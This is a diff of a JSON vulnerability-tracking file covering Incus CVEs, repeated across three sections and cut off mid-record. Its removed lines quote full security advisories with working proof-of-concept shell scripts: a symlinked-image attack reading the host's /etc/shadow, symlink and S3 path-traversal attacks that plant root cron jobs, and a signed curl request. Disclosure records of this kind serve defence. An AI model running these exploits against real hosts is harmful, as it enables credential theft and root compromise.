@@ -313,8 +313,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -339,8 +339,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -352,8 +352,8 @@
             },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nFor container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.\n\nFor instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.\n\nIn practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.\n\n\n### PoC\n\n#### Malicious container image\n\nBelow, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/templates\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC templates symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar\nincus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink\nincus init afrw-image-templates-symlink afrw-image-templates-symlink\n\nincus config template ls afrw-image-templates-symlink\n\n# read\n#incus config template show afrw-image-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-image-templates-symlink poc-32\n#incus config template edit afrw-image-templates-symlink poc\n```\n\n#### Malicious instance backup\n\n\nBelow, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/backup\"\ncat<<__EOF__>\"${tmpdir}/img/backup/index.yaml\"\nname: afrw-backup-templates-symlink\nbackend: dir\npool: default\ntype: container\noptimized: false\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container\"\ncat<<__EOF__>\"${tmpdir}/img/backup/container/backup.yaml\"\ncontainer:\n  name: afrw-backup-templates-symlink\n  architecture: x86_64\n  type: container\n  status: Stopped\n  status_code: 102\n  stateful: false\n  ephemeral: false\n  profiles:\n    - default\n  config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  expanded_config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  devices: {}\n  expanded_devices:\n    root:\n      path: /\n      pool: default\n      type: disk\n  created_at: \"2024-01-01T00:00:00Z\"\n  last_used_at: \"2024-01-01T00:00:00Z\"\nvolume:\n  name: afrw-backup-templates-symlink\n  type: container\n  content_type: filesystem\n  config: {}\npool:\n  name: default\n  driver: dir\n  config: {}\n__EOF__\n\ncat<<__EOF__>\"${tmpdir}/img/backup/container/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: afrw-backup-templates-symlink\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/backup/container/templates\"\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar\nincus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink\n\nincus config template ls afrw-backup-templates-symlink\n\n# read\n#incus config template show afrw-backup-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-backup-templates-symlink poc-32\n#incus config template edit afrw-templates-symlink poc\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -365,8 +365,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -378,8 +378,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
-                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -404,8 +404,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -767,8 +767,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -793,8 +793,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -806,8 +806,8 @@
             },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nFor container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.\n\nFor instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.\n\nIn practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.\n\n\n### PoC\n\n#### Malicious container image\n\nBelow, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/templates\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC templates symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar\nincus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink\nincus init afrw-image-templates-symlink afrw-image-templates-symlink\n\nincus config template ls afrw-image-templates-symlink\n\n# read\n#incus config template show afrw-image-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-image-templates-symlink poc-32\n#incus config template edit afrw-image-templates-symlink poc\n```\n\n#### Malicious instance backup\n\n\nBelow, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/backup\"\ncat<<__EOF__>\"${tmpdir}/img/backup/index.yaml\"\nname: afrw-backup-templates-symlink\nbackend: dir\npool: default\ntype: container\noptimized: false\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container\"\ncat<<__EOF__>\"${tmpdir}/img/backup/container/backup.yaml\"\ncontainer:\n  name: afrw-backup-templates-symlink\n  architecture: x86_64\n  type: container\n  status: Stopped\n  status_code: 102\n  stateful: false\n  ephemeral: false\n  profiles:\n    - default\n  config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  expanded_config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  devices: {}\n  expanded_devices:\n    root:\n      path: /\n      pool: default\n      type: disk\n  created_at: \"2024-01-01T00:00:00Z\"\n  last_used_at: \"2024-01-01T00:00:00Z\"\nvolume:\n  name: afrw-backup-templates-symlink\n  type: container\n  content_type: filesystem\n  config: {}\npool:\n  name: default\n  driver: dir\n  config: {}\n__EOF__\n\ncat<<__EOF__>\"${tmpdir}/img/backup/container/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: afrw-backup-templates-symlink\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/backup/container/templates\"\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar\nincus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink\n\nincus config template ls afrw-backup-templates-symlink\n\n# read\n#incus config template show afrw-backup-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-backup-templates-symlink poc-32\n#incus config template edit afrw-templates-symlink poc\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -819,8 +819,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
-                "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -832,8 +832,8 @@
             },
             "CVE-2026-48754": {
                 "cve_id": "CVE-2026-48754",
-                "title": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
-                "description": "Incus: Nil-pointer dereference in createDependentVolumesFromBackup\u00a0on disk.{Volume,VolumeSnapshots,Pool} in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -858,8 +858,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
+                "description": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7) in github.com/lxc/incus",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1221,8 +1221,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1247,8 +1247,8 @@
             },
             "CVE-2026-48751": {
                 "cve_id": "CVE-2026-48751",
-                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
-                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -1260,8 +1260,8 @@
             },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image",
-                "description": "### Summary\n\nA specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nFor container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.\n\nFor instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.\n\nIn practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.\n\n\n### PoC\n\n#### Malicious container image\n\nBelow, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/templates\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC templates symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar\nincus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink\nincus init afrw-image-templates-symlink afrw-image-templates-symlink\n\nincus config template ls afrw-image-templates-symlink\n\n# read\n#incus config template show afrw-image-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-image-templates-symlink poc-32\n#incus config template edit afrw-image-templates-symlink poc\n```\n\n#### Malicious instance backup\n\n\nBelow, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/backup\"\ncat<<__EOF__>\"${tmpdir}/img/backup/index.yaml\"\nname: afrw-backup-templates-symlink\nbackend: dir\npool: default\ntype: container\noptimized: false\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container\"\ncat<<__EOF__>\"${tmpdir}/img/backup/container/backup.yaml\"\ncontainer:\n  name: afrw-backup-templates-symlink\n  architecture: x86_64\n  type: container\n  status: Stopped\n  status_code: 102\n  stateful: false\n  ephemeral: false\n  profiles:\n    - default\n  config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  expanded_config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  devices: {}\n  expanded_devices:\n    root:\n      path: /\n      pool: default\n      type: disk\n  created_at: \"2024-01-01T00:00:00Z\"\n  last_used_at: \"2024-01-01T00:00:00Z\"\nvolume:\n  name: afrw-backup-templates-symlink\n  type: 